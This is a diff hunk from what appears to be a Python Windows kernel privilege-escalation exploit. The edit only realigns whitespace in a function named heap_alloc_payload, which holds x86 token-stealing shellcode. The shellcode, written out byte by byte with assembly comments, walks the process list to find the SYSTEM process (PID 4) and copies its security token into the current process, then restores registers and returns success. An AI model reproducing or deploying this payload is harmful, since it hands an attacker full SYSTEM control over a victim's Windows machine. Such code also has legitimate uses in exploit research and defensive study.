@@ -17,24 +17,24 @@ def heap_alloc_payload():
 	''' Allocs SYSTEM token stealing shellcode in memory '''
 	token_stealing_shellcode = (
 		#---[Setup]
-		"\x60"                      	# pushad
-		"\x64\xA1\x24\x01\x00\x00" 		# mov eax, fs:[KTHREAD_OFFSET]
-		"\x8B\x40\x50"              	# mov eax, [eax + EPROCESS_OFFSET]
-		"\x89\xC1"                  	# mov ecx, eax (Current _EPROCESS structure)
-		"\x8B\x98\xF8\x00\x00\x00" 		# mov ebx, [eax + TOKEN_OFFSET]
+		"\x60"                          # pushad
+		"\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
+		"\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
+		"\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
+		"\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
 		#---[Copy System PID token]	
-		"\xBA\x04\x00\x00\x00"      	# mov edx, 4 (SYSTEM PID)
-		"\x8B\x80\xB8\x00\x00\x00"  	# mov eax, [eax + FLINK_OFFSET] <-|
-		"\x2D\xB8\x00\x00\x00"      	# sub eax, FLINK_OFFSET           |
-		"\x39\x90\xB4\x00\x00\x00"  	# cmp [eax + PID_OFFSET], edx     |
-		"\x75\xED"                  	# jnz                           ->|
-		"\x8B\x90\xF8\x00\x00\x00"  	# mov edx, [eax + TOKEN_OFFSET]
-		"\x89\x91\xF8\x00\x00\x00"  	# mov [ecx + TOKEN_OFFSET], edx
+		"\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
+		"\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
+		"\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
+		"\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
+		"\x75\xED"                      # jnz                           ->|
+		"\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
+		"\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
 		#---[Recover]	
-		"\x61"                      	# popad
-		"\x31\xC0"                  	# NTSTATUS -> STATUS_SUCCESS
-		"\x5D"                      	# pop ebp
-		"\xC2\x08\x00"		           	# ret 8
+		"\x61"                          # popad
+		"\x31\xC0"                      # NTSTATUS -> STATUS_SUCCESS
+		"\x5D"                          # pop ebp
+		"\xC2\x08\x00"                  # ret 8
 	)
 	
 	payload_length = len(token_stealing_shellcode)
